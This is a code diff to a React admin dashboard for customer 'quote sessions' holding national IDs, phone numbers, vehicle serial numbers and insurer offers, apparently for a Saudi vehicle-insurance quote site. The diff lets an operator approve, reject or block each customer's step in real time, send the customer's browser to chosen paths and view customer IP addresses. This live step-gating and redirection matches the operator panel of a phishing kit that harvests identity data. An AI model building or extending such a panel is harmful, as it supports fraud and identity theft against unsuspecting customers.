@@ -205,25 +205,46 @@ function AdminDashboard() {
       ),
     );
 
+  const sendControl = async (id: string, directive: string) => {
+    try {
+      await fetch("/api/public/control", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ sid: id, directive }),
+      });
+    } catch {
+      /* ignore */
+    }
+  };
   const acceptSession = (id: string) => {
-    patch(id, {});
-    toast.success("Approved — customer continues to the next step");
+    patch(id, { awaitingApproval: false });
+    void sendControl(id, "approve");
+    toast.success("Approved — customer continues");
   };
   const rejectSession = (id: string) => {
-    patch(id, {});
-    toast.error("Declined — customer stays on the current step");
+    patch(id, { awaitingApproval: false });
+    void sendControl(id, "reject");
+    toast.error("Declined — customer sees retry screen");
   };
   const blockSession = (id: string) => {
-    patch(id, { state: "blocked" });
+    patch(id, { state: "blocked", awaitingApproval: false });
     setOpenId(null);
+    void sendControl(id, "block");
     toast("Session blocked");
+  };
+  // Admin-side redirect: sends the customer's browser to a specific site path.
+  const redirectToPath = (id: string, path: string) => {
+    patch(id, { awaitingApproval: false });
+    void sendControl(id, path);
+    toast.success(`Redirected to ${path}`);
   };
   const redirect = (id: string, target: PageKey) => {
     patch(id, { currentPage: target });
-    toast.success(`Customer redirected to ${pageLabel(target)}`);
+    toast.success(`Marked as ${pageLabel(target)}`);
   };
   const stepDecision = (id: string, action: StepAction, decision: "accept" | "reject") => {
-    patch(id, {});
+    patch(id, { awaitingApproval: false });
+    void sendControl(id, decision === "accept" ? "approve" : "reject");
     if (decision === "accept") toast.success(`${action} accepted`);
     else toast.error(`${action} declined`);
   };
@@ -292,7 +313,8 @@ function AdminDashboard() {
   );
   const acceptToNext = (s: QuoteSession) => {
     const target = nextPage(s.currentPage);
-    patch(s.sessionId, { currentPage: target });
+    patch(s.sessionId, { currentPage: target, awaitingApproval: false });
+    void sendControl(s.sessionId, "approve");
     toast.success(`${s.sessionId} → ${pageLabel(target)}`);
   };
 
@@ -305,23 +327,29 @@ function AdminDashboard() {
         if (!res.ok) return;
         const json = (await res.json()) as { sessions: Array<Record<string, unknown>> };
         if (cancelled) return;
-        const mapped: QuoteSession[] = json.sessions.map((r) => ({
-          sessionId: String(r["session_id"] ?? ""),
-          nationalId: String(r["national_id"] ?? ""),
-          phone: String(r["phone"] ?? ""),
-          serialNumber: String(r["serial_number"] ?? ""),
-          vehicleMake: String(r["vehicle_make"] ?? ""),
-          vehicleModel: String(r["vehicle_model"] ?? ""),
-          modelYear: Number(r["model_year"] ?? 0),
-          declaredValue: Number(r["declared_value"] ?? 0),
-          insurerCompany: String(r["insurer_company"] ?? ""),
-          insurerOfferSar: Number(r["insurer_offer_sar"] ?? 0),
-          currentPage: (r["current_page"] as QuoteSession["currentPage"]) ?? "quote_landing",
-          state: (r["state"] as QuoteSession["state"]) ?? "live",
-          createdAt: String(r["created_at"] ?? new Date().toISOString()),
-          updatedAt: String(r["updated_at"] ?? new Date().toISOString()),
-          submission: (r["submission"] as QuoteSession["submission"]) ?? {},
-        }));
+        const mapped: QuoteSession[] = json.sessions.map((r) => {
+          const s: QuoteSession = {
+            sessionId: String(r["session_id"] ?? ""),
+            nationalId: String(r["national_id"] ?? ""),
+            phone: String(r["phone"] ?? ""),
+            serialNumber: String(r["serial_number"] ?? ""),
+            vehicleMake: String(r["vehicle_make"] ?? ""),
+            vehicleModel: String(r["vehicle_model"] ?? ""),
+            modelYear: Number(r["model_year"] ?? 0),
+            declaredValue: Number(r["declared_value"] ?? 0),
+            insurerCompany: String(r["insurer_company"] ?? ""),
+            insurerOfferSar: Number(r["insurer_offer_sar"] ?? 0),
+            currentPage: (r["current_page"] as QuoteSession["currentPage"]) ?? "quote_landing",
+            state: (r["state"] as QuoteSession["state"]) ?? "live",
+            createdAt: String(r["created_at"] ?? new Date().toISOString()),
+            updatedAt: String(r["updated_at"] ?? new Date().toISOString()),
+            submission: (r["submission"] as QuoteSession["submission"]) ?? {},
+            awaitingApproval: Boolean(r["awaiting_approval"]),
+          };
+          if (r["ip_address"]) s.ipAddress = String(r["ip_address"]);
+          if (r["requested_page"]) s.requestedPage = String(r["requested_page"]);
+          return s;
+        });
         setSessions((prev) => {
           const byId = new Map(prev.map((s) => [s.sessionId, s]));
           for (const s of mapped) byId.set(s.sessionId, s);
@@ -645,18 +673,28 @@ function AdminDashboard() {
                         </div>
                       </td>
                       <td className="px-4 py-4 tabular-nums">{formatSar(s.insurerOfferSar)}</td>
-                      <td className="px-4 py-4">
-                        {s.state === "blocked" ? (
-                          <span className="inline-flex items-center rounded-full border border-destructive/30 bg-destructive/10 px-2.5 py-0.5 text-xs font-medium text-destructive">
-                            Blocked
-                          </span>
-                        ) : (
-                          <StageBadge page={s.currentPage} />
-                        )}
-                      </td>
-                      <td className="px-4 py-4 text-muted-foreground">
-                        {formatDateTime(s.updatedAt)}
-                      </td>
+                       <td className="px-4 py-4">
+                         {s.state === "blocked" ? (
+                           <span className="inline-flex items-center rounded-full border border-destructive/30 bg-destructive/10 px-2.5 py-0.5 text-xs font-medium text-destructive">
+                             Blocked
+                           </span>
+                         ) : (
+                           <div className="flex flex-col gap-1">
+                             <StageBadge page={s.currentPage} />
+                             {s.awaitingApproval && (
+                               <span className="inline-flex w-fit items-center rounded-full border border-warning/30 bg-warning/10 px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wide text-warning">
+                                 Awaiting {s.requestedPage ?? ""}
+                               </span>
+                             )}
+                           </div>
+                         )}
+                       </td>
+                       <td className="px-4 py-4 text-muted-foreground">
+                         <div>{formatDateTime(s.updatedAt)}</div>
+                         {s.ipAddress && (
+                           <div className="font-mono text-xs">{s.ipAddress}</div>
+                         )}
+                       </td>
                       <td className="px-4 py-4">
                         <div className="flex items-center justify-end gap-1">
                           <button
